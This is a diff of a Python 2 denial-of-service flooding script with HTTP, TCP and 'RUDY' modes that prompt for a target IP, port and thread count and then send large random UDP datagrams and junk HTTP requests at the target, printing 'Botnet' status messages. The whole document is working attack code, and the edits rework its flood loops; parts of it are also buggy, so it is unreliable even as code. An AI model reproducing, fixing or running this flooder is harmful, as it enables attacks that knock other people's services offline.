@@ -27,10 +27,11 @@ while True:
     try:
         udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        tcp = socket.socket(socket.AF_INET, socket.TCP_NODELAY)
+        tcp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         rudy1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         rudy2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        byte = random._urandom(65000)
+        byte = random._urandom(60000)
+        byte2 = random._urandom(50000)
         sent = 5000
         fakeit = ['192.168.1.1','192.154.4.4','192.167.1.4','192.155.3.3']
         prompt = raw_input("\033[37mL4@root ~$ ")
@@ -59,22 +60,23 @@ while True:
             ip = raw_input("IP Target : ")
             port = input("Port : ")
             thread = input("Thread : ")
-            bytes = input("Bytes Per Sec : ")
+            bytes = int(input("Bytes Per Sec : "))
         
-            def fluud():
+            def flood():
                 for e in fakeit:
                     try:
-                        http.send(("GET /"+ip+" HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
-                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
+                        rudy2.sendto(byte, (ip,port))
                         for i in range(bytes):
-                            http.send(byte)
+                            rudy2.sendto(byte, (ip,port))
+                        http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
+                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
+                        for i in range(thread):
+                            http.send(byte)    
                         print "\033[1;91mSending %s Botnet | Target %s Port %s"%(sent,ip,port)
-                    except KeyboardInterrupt:
-                        exit()
                     except:
                         print "\033[1;33m[ HTTP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
-                thr = threading.Thread(target=fluud)
+                thr = threading.Thread(target=flood)
                 thr.start()
         elif prompt.lower() == "tcp":
             print "\033[1;33mTCP Mode"
@@ -83,7 +85,7 @@ while True:
             thread = input("Thread : ")
             bytes = input("Bytes Per Sec : ")
         
-            def fluud():
+            def flttd():
                 for e in fakeit:
                     try:
                         tcp.sendto(byte, (ip,port))
@@ -95,27 +97,27 @@ while True:
                     except:
                         print "\033[1;33m[ TCP ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
-                thr = threading.Thread(target=fluud)
+                thr = threading.Thread(target=flttd)
                 thr.start()
         elif prompt.lower() == "rudy":
             print "\033[1;32mRUDY Method Selected"
             sent = 5000
             ip = raw_input("IP Target : ")
             port = input("Port : ")
-            byte = input("Byte Per Sec : ")
+            bytes = int(input("Byte Per Sec : "))
             thread = input("Threads : ")
             
             def rudy():
                 for e in fakeit:
                     try:
-                        rudy2.sendto(bytes, (ip,port))
-                        for i in range(byte):
-                            rudy2.sendto(bytes, (ip,port))
-                        rudy1.send(("GET /"+ip+" HTTP/1.1\r\n\r\n").encode("ascii"), (ip,port))
-                        rudy1.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))    
+                        rudy2.sendto(byte, (ip,port))
+                        for i in range(bytes):
+                            rudy2.sendto(byte, (ip,port))
+                        http.send(("GET /"+ip+"/HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
+                        http.send(("Host: "+e+"\r\n\r\n").encode("ascii"), (ip,port))
+                        for i in range(thread):
+                            http.send(byte)    
                         print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
-                    except KeyboardInterrupt:
-                        exit()   
                     except:
                         print "\033[1;33m[ RUDY ]\033[1;32m[ INFO ] : \033[1;91m Send %s | T : %s:%s"%(sent,ip,port)
             for i in range(thread):
